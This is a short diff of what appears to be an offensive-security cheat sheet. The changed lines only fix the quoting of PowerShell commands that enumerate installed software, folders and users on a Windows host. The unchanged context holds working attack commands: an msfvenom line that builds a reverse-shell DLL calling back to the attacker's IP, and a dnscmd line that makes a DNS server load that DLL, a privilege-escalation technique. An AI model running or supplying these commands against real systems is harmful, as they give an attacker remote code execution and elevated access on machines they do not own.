@@ -1255,9 +1255,9 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f dll -o 0.dll
 dnscmd.exe /config /serverlevelplugindll \\$MYIP\share\0.dll
 
 +---------- Initial Checks ----------+
-Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publishe
-Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object { $_.Publisher -and $_.Publisher -notlike "*Microsoft*" } | Select-Object DisplayName, DisplayVersion, Publisher
-powershell -c "ls -force \"
+powershell -c "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher"
+powershell -c 'Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object { $_.Publisher -and $_.Publisher -notlike """*Microsoft*""" } | Select-Object DisplayName, DisplayVersion, Publisher'
+powershell -c "ls -force \\"
 powershell -c "tree \users /a /f"
 powershell -c "net user $USERNAME"
 powershell -c "tree \inetpub /a /f"
